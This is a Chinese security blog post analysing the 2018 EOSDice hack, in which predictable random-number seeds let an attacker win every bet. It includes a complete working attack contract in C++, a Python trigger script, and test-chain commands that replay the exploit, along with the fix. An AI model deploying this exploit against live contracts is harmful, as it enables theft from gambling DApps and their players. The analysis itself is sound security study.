---
title: EOS DApp 随机数漏洞分析1 - EOSDice 随机数被预测
date: 2019-05-14 18:03:59
permalink: eosdice-random1
category:
    - 区块链安全
tags:
    - 随机数
    - EOS DApp
author: 零时科技
---

EOSDice 在2018年11月3日受到黑客攻击，被盗2,545 EOS，约合 1.35 万美元，针对这个漏洞，零时科技团队进行了详细的分析及攻击过程复盘，尽管这个漏洞已经发生过一段时间，不过这个因随机数被预测引发的漏洞还是比较典型。

<!-- more -->


## 漏洞背景

`EOSDice` 在2018年11月3日受到黑客攻击，根据 `EOSDice` 官方通告，此次攻击共被盗 `2,545.1135 EOS`，约 1.35 万美元，当时价格 1 EOS ≈ 5.13 USD），下图为交易截图：

![黑客攻击被盗](https://img.learnblockchain.cn/2019/15578435171577.jpg)



## 技术分析

由于`EOSDice`被攻击是因为该游戏的的随机数算法被破解，而且使用的`defer action`进行开奖。那我们具体分析一下`EOSDice`的随机数算法是否存在漏洞。

###  EOSDice 合约所使用的随机数

因为`EOSDice`的合约已经开源，我们从 Github [合约源码](https://github.com/loveblockchain/eosdice/blob/f1ba04ea071936a8b5ba910b76597544a9e839fa/eosbocai2222.hpp#L172) 找到了`EOSDice`的随机数算法，代码如下：

```c++
    uint8_t random(account_name name, uint64_t game_id)
    {
        asset pool_eos = eosio::token(N(eosio.token)).get_balance(_self, symbol_type(S(4, EOS)).name());
        auto mixd = tapos_block_prefix() * tapos_block_num() + name + game_id - current_time() + pool_eos.amount;

        const char *mixedChar = reinterpret_cast<const char *>(&mixd);

        checksum256 result;
        sha256((char *)mixedChar, sizeof(mixedChar), &result);

        uint64_t random_num = *(uint64_t *)(&result.hash[0]) + *(uint64_t *)(&result.hash[8]) + *(uint64_t *)(&result.hash[16]) + *(uint64_t *)(&result.hash[24]);
        return (uint8_t)(random_num % 100 + 1);
    }
```


可以看到，`EOSDice`官方的随机数算法为6个随机数种子进行数学运算，再哈希，最后再进行一次数学运算。`EOSDice`官方选择的随机数种子为

- tapos_block_prefix # ref block 的信息
- tapos_block_num #  ref block 的信息
- account_name # 本合约的名字
- game_id # 本次游戏的游戏id，从1自增
- current_time # 当前开奖的时间戳
- pool_eos # 本合约的EOS余额



### 随机数种子分析

其中随机数种子`account_name`、`game_id`、`pool_eos`很容易获取到，那么如果需要预测随机数，必须要预测所有的随机数种子，也就是 说`current_time`、`tapos_block_prefix`、`tapos_block_num`也要可以预测。

1. 那么，首先分析`current_time`是否可以预测

根据`EOS`官方的描述

![current_time](https://img.learnblockchain.cn/2019/15578445507382.jpg)


其实返回的就是一个时间戳，由于`EOSDice`开奖使用的是`defer action` （延时交易），因此，我们只需要知道下注的`action`的时间戳再加上`delay_sec`就可以算出开奖`reval`的时间戳了。`EOSDice`的`delay_sec`为1秒，所以`开奖时时间戳 = 下注时时间戳 + 1000000`。

2. 接着，我们分析`tapos_block_prefix`和`tapos_block_num`是否可以预测

> 注： tapos: Transactions as Proof-of-Stake (TaPOS) 它指定一个过去的区块（ ref_block_num ），用来做 Proof-of-Stake 的 ， 代码中使用的 tapos_block_preﬁx 和tapos_block_num， 正是由这个 ref_block_num 算出来的。

其实，`tapos_block_prefix`和`tapos_block_num`均为开奖`block`的`ref block`的信息。`EOS`为了防止分叉，所以每一个`block`都会有一个`ref block`也就是引用块。因为`reveal`开奖的块在下注前并不知道，它的`ref block`看似也不知道，所以貌似这两个种子是未来的值。不过，根据`EOS`的机制，因为开奖采用的是`defer action`，所以`reveal`开奖块的`ref block`为下注块的前一个块，也就是说`tapos_block_prefix`和`tapos_block_num`是在下注前可以获取到的！

![应用块 ref block](https://img.learnblockchain.cn/2019/15578448446006.jpg)


至此，`EOSDice`的随机数种子在下注前均可以获取，那就意味着我们可以在下注前预测到下注后的随机数，完全可以达到必中的效果。

### 攻击合约

下面是我们测试攻击的合约，完成的功能是根据`EOSDice`的随机数算法来预测此次下注的随机数的值，然后选择`roll`的值比预测值大一即可中奖。

```c++
#include <utility>
#include <vector>
#include <string>
#include <eosiolib/eosio.hpp>
#include <eosiolib/time.hpp>
#include <eosiolib/asset.hpp>
#include <eosiolib/contract.hpp>
#include <eosiolib/types.hpp>
#include <eosiolib/transaction.hpp>
#include <eosiolib/crypto.h>
#include <boost/algorithm/string.hpp>
#include "eosio.token.hpp"

using eosio::asset;
using eosio::permission_level;
using eosio::action;
using eosio::print;
using eosio::name;
using eosio::unpack_action_data;
using eosio::symbol_type;
using eosio::transaction;
using eosio::time_point_sec;


class attack : public eosio::contract {
    public:
        attack(account_name self):eosio::contract(self)
        {}

        uint8_t random(account_name name, uint64_t game_id, uint32_t prefix, uint32_t num)
        {
            asset pool_eos = eosio::token(N(eosio.token)).get_balance(N(eosbocai2222), symbol_type(S(4, EOS)).name());
            auto amount = pool_eos.amount + 10000;
            auto time = current_time() + 1000000;
            //auto mixd = tapos_block_prefix() * tapos_block_num() + name + game_id - current_time() + pool_eos.amount;
            auto mixd = prefix * num + name + game_id - time + amount;
            
            print(
                "[ATTACK RANDOM]tapos-prefix=>", (uint32_t)prefix, 
                "|tapos-num=>", num, 
                "|current_time=>", time,
                "|game_id=>", game_id,
                "|poll_amount=>", amount,
                "\n"
            );
            const char *mixedChar = reinterpret_cast<const char *>(&mixd);

            checksum256 result;
            sha256((char *)mixedChar, sizeof(mixedChar), &result);

            uint64_t random_num = *(uint64_t *)(&result.hash[0]) + *(uint64_t *)(&result.hash[8]) + *(uint64_t *)(&result.hash[16]) + *(uint64_t *)(&result.hash[24]);
            return (uint8_t)(random_num % 100 + 1);
        }

        //@abi action
        void hi(uint64_t id, uint32_t block_prefix, uint32_t block_num)
        {
            //uint8_t roll;
            uint8_t random_roll = random(N(attacker), id, block_prefix, block_num);
            print("[ATTACK]predict random num =>", (int)random_roll,"\n");
            if((int)random_roll >2 && (int)random_roll <94)
            {
                int roll = (int)random_roll + 1;
                auto dice_str = "dice-noneage-" + std::to_string(roll) + "-user";
                print("[ATTACK]current_time=>", current_time(), "\n");
                print(
                    "[ATTACK]tapos-prefix=>", (uint32_t)tapos_block_prefix(), 
                    "|tapos-num=>", tapos_block_num(),
                    "\n"
                );
                print("[ATTACK] before transfer");
                action(
                    permission_level{_self, N(active)},
                    N(eosio.token), N(transfer),
                    std::make_tuple(_self, N(eosbocai2222), asset(10000, S(4, EOS)), dice_str)
                ).send();
            }
        }
};

#define EOSIO_ABI_EX( TYPE, MEMBERS ) \
extern "C" { \
   void apply( uint64_t receiver, uint64_t code, uint64_t action ) { \
      auto self = receiver; \
      if( code == self || code == N(eosio.token)) { \
         if( action == N(transfer)){ \
                eosio_assert( code == N(eosio.token), "Must transfer EOS"); \
         } \
         TYPE thiscontract( self ); \
         switch( action ) { \
            EOSIO_API( TYPE, MEMBERS ) \
         } \
         /* does not allow destructor of thiscontract to run: eosio_exit(0); */ \
      } \
   } \
}

EOSIO_ABI_EX( attack,
        (hi)
)
```

### 攻击脚本

下面，我们的测试攻击脚本，完成的功能是获取最新的块和块的id，计算出`EOSDice`开奖`action`的`tapos_block_prefix`和`tapos_block_num`，发送给上一个测试攻击的合约。

```python
import requests
import json
import os
import binascii
import struct
import sys

game_id = sys.argv[1]
# get tapos block num
url = "http://127.0.0.1:8888/v1/chain/get_info"
response = requests.request("POST", url)
res = json.loads(response.text)
last_block_num = res["head_block_num"]
# get tapos block id
url = "http://127.0.0.1:8888/v1/chain/get_block"
data = {"block_num_or_id":last_block_num}
response = requests.post(url, data=json.dumps(data))
res = json.loads(response.text)
last_block_hash = res["id"]
# get tapos block prefix
block_prefix = struct.unpack("<I", binascii.a2b_hex(last_block_hash)[8:12])[0]
# attack
cmd = '''cleos push action attacker hi '["%s","%s","%s"]' -p attacker@owner''' % (str(game_id), str(block_prefix), str(last_block_num))
os.system(cmd)
```



### 攻击测试流程

1. 创建相关账户并设置权限

```bash
# 创建EOSDICE相关账户和权限
cleos create account eosio eosbocai2222 EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVk
cleos set account permission eosbocai2222 active '{"threshold": 1,"keys": [{"key": "EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi","weight": 1}],"accounts":[{"permission":{"actor":"eosbocai2222","permission":"eosio.code"},"weight":1}]}' owner -p eosbocai2222
# 创建攻击者相关账户机器权限
cleos create account eosio attacker EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVk
cleos set account permission attacker active '{"threshold": 1,"keys": [{"key": "EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi","weight": 1}],"accounts":[{"permission":{"actor":"attacker","permission":"eosio.code"},"weight":1}]}' owner -p eosbocai1111
```

2. 给相关账户发送代币

```bash
cleos push action eosio.token issue '["attacker", "10000.0000 EOS", "memo"]' -p eosio
cleos push action eosio.token issue '["eosbocai2222", "10000.0000 EOS", "memo"]' -p eosio
```

3. 编译相关合约并部署

```bash
# 编译攻击合约
eosiocpp -o attack.wast attack.cpp
eosiocpp -g attack.abi attack.cpp
# 部署攻击合约
cleos set contract ~/attack -p attack@owner

# 编译EOSDICE合约
eosiocpp -o eosdice.wast eosbocai2222.cpp
eosiocpp -g eosdice.abi eosbocai2222.cpp
# 部署EOSDICE合约
cleos set code eosbocai2222 eosdice.wasm -p eosbocai2222@owner
cleos set abi eosbocai2222 eosdice.abi -p eosbocai2222@owner
```

4. 初始化`EOSDice`合约

```bash
cleos push action eosbocai2222 init '[""]' -p eosbocai2222
```

最后，我们来测试一下，我们可以很容易的获取到下次投注的`game_id`，此次为109。

```bash
python script.py 109
```

我们看一下合约的执行结果，可以看出，攻击合约预测的随机数和`EOSDice`的开奖`action`算出来的完全一致！这样就可以达到每次必中！

![中奖结果](https://img.learnblockchain.cn/2019/15578452291649.jpg)



## 官方漏洞修复方法

漏洞修复很简单（也引起了后面再次被盗）：


1. 开奖的`action`由一次`defer action`变成了两次`defer action`

![漏洞修复 两次defer action ](https://img.learnblockchain.cn/2019/15578453316229.jpg)

漏洞修复代码在这个[提交](https://github.com/loveblockchain/eosdice/commit/50a05dfb6c0d68b6035ed49d01133b5c2edaefdf) 。

根据前面我们提到的内容，`defer action`的`ref block`为发起`defer action`的前一个块。但是，在我们下注的时候这个块是无法预知的；



2. 账户的余额用很多账户的总和加起来当成随机数种子

![多账户余额](https://img.learnblockchain.cn/2019/15578454191250.jpg)


漏洞修复代码在这个[提交](https://github.com/loveblockchain/eosdice/commit/3c6f9bac570cac236302e94b62432b73f6e74c3b)

`EOSDice`的账户余额用了很多账户的余额的总和来当种子，这个貌似也是无法预测变化的。不过这样真的安全了吗？很明显，不是的，仅在漏洞修复6天后`EOSDice`再次受到随机数攻击，下篇文章会详细分析[EOS DApp 随机数漏洞分析2 - EOSDice 随机数被操控](https://learnblockchain.cn/2019/05/14/eosdice-random2/)。

## 推荐修复方法

如何得到安全的随机数是一个普遍的难题，在区块链上尤其困难，因为区块链上无法获取外部随机源。
> 关于区块链随机数，推荐阅读[区块链上的随机性（一）概述与构造](https://learnblockchain.cn/2019/01/26/randomness-blockchain-1/) 及 [区块链上的构建随机性的项目分析](https://learnblockchain.cn/2019/04/22/randomness-blockchain-2/)

要在区块链上选择一个无法被提前预知种子确实困难。零时科技安全专家推荐参考 `EOS` 官方的[随机数生成方法](https://developers.eos.io/eosio-cpp/docs/random-number-generation)来生成较为安全的随机数。


文章用到的所有代码均在[github](https://github.com/NoneAge/EOS_dApp_Security_Incident_Analysis)， 本文所有过程均在本地测试节点完成。

## 参考链接 

1. [EOS上如何安全生成随机数](https://blog.csdn.net/TurkeyCock/article/details/84730045)
2. [EOSDIEC 随机数被攻破](https://igaojin.me/2018/11/04/EODIDEC-%E9%9A%8F%E6%9C%BA%E6%95%B0%E8%A2%AB%E6%94%BB%E7%A0%B4/)
3. [eos 文档](https://developers.eos.io/eosio-nodeos/reference#get_block)
4. [eosdice 合约源码](https://github.com/loveblockchain/eosdice/tree/f1ba04ea071936a8b5ba910b76597544a9e839fa)
5. [eos 文档-生成随机数](https://developers.eos.io/eosio-cpp/docs/random-number-generation)


本文由深入浅出区块链社区合作伙伴-[零时科技安全团队](http://www.noneage.com/)提供。

[深入浅出区块链](https://learnblockchain.cn/) - 系统学习区块链，学区块链都在这里，打造最好的区块链技术博客。





